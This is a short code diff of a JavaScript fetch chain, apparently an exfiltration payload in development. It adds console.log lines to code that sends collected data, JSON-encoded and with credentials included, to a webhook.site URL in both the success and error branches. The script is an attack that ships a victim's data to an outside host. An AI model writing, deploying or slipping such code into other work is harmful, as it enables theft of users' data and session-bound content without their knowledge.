@@ -22,6 +22,7 @@
     }));
   })
   .then(data => {
+     console.log('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+ encodeURIComponent(JSON.stringify(data)))
     fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+encodeURIComponent(JSON.stringify(data)), {
       method: 'GET',
       credentials: 'include',
@@ -29,7 +30,7 @@
     });
   })
   .catch(data => {
-  
+    console.log('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+ encodeURIComponent(JSON.stringify(data)))
     fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+ encodeURIComponent(JSON.stringify(data)), {
       method: 'GET',
 credentials: 'include',
